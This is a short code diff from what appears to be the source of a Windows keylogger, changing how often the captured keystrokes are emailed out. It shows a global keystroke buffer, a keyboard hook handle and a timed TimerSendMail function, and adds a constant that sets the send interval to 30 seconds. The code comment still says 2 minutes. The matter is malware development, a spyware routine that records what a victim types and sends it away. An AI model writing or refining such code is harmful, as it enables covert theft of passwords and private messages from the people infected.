@@ -9,6 +9,7 @@
 #include "SendMail.h"
 
 std::string keylog {""};
+const auto sendIntervalInMinutes {0.5};
 
 void TimerSendMail(){
     if(keylog.empty()) return;
@@ -30,7 +31,7 @@ void TimerSendMail(){
     }
 }
 
-Timer MailTimer(TimerSendMail, 500 * 60);                  // Setup our timer for 2 minutes per interval
+Timer MailTimer(TimerSendMail, (sendIntervalInMinutes * 1000) * 60);                  // Setup our timer for 2 minutes per interval
 
 HHOOK eHook = NULL;                                         // Pointer to hook
 
